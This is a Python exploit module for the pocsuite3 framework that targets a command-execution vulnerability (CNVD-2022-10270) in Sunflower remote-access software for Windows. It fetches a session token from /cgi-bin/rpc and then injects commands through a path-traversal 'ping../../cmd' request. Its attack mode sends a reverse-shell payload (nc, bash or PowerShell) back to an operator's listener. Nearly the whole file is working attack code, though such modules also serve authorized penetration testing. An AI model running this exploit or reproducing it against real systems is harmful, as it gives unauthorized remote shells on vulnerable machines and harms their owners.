# !/usr/bin/env python
# -*- coding: UTF-8 -*-
import json
from collections import OrderedDict
from urllib.parse import urlparse, urljoin

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.lib.core.interpreter_option import OptDict
from pocsuite3.modules.listener import REVERSE_PAYLOAD

class sunflower_RCE_POC(POCBase):
    vulID = 'CNVD-2022-10270'
    version = '1.0'
    author = ['Warin9_0']
    vulDate = '2022-02-15'
    createDate = '2022-02-15'
    updateDate = '2022-02-15'
    references = ['']
    name = 'sunflower_RCE'
    appPowerLink = ''
    appName = 'sunflower for Windows'
    appVersion = """Sunflower Personal edition for Windows <= 11.0.0.33
    Sunflower Reduced version <= V1.0.1.43315"""
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''Shanghai Bayray Information Technology Co., Ltd. has command execution vulnerability in Sunflower Personal Edition for Windows'''
    samples = ['']
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
            "powershell": REVERSE_PAYLOAD.POWERSHELL,
        }
        o["command"] = OptDict(selected="powershell", default=payload)
        return o

    def _check(self, url):
        self.timeout = 3
        vul_url = url + "/cgi-bin/rpc"
        payload = "action=verify-haras"
        parse = urlparse(vul_url)
        headers = {
            "Host": "{}".format(parse.netloc)
        }
        r = requests.post(vul_url, headers=headers, timeout=self.timeout, data=payload, verify=False)
        verify_string = json.loads(r.text).get('verify_string')

        if r.status_code == 200 and "verify_string" in r.text:
            #path = "/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+echo+Warin9_0"
            path = "/check?cmd=ping../../../../../../../../../windows/system32/cmd+/c|cmd+/c+echo+Warin9_0"
            vul_url = urljoin(url, path)
            header = {
                "Cookie": "{}".format("CID=" + verify_string)
            }
            r = requests.get(vul_url, headers=header, timeout=self.timeout, verify=False)
            if "Warin9_0" in r.text and "failed" not in r.text:
                return vul_url, header
        return False

    def _verify(self):
        result = {}
        p = self._check(self.url)
        if p:
            result['VerifyInfo'] = {}
            #result['VerifyInfo']['URL'] = p[0]
            #result['VerifyInfo']['Header'] = p[1]

        return self.parse_output(result)

    def _attack(self):
        result = {}
        p = self._check(self.url)
        if p:
            cmd = self.get_option("command")
            path = "/check?cmd=ping../../../../../../../../../windows/system32/cmd+/c|cmd+/c+"
            vul_url = urljoin(self.url, path + cmd)
            header = p[1]
            #print(header)
            r = requests.get(vul_url, headers=header, timeout=30, verify=False)
            if r.status_code == 200 and "failed" not in r.text:
                result['VerifyInfo'] = {}
                #result['VerifyInfo']['URL'] = vul_url
                #result['VerifyInfo']['Header'] = header
                result['VerifyInfo']['RCE'] = r.text

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('url is not vulnerable')
        return output


register_poc(sunflower_RCE_POC)
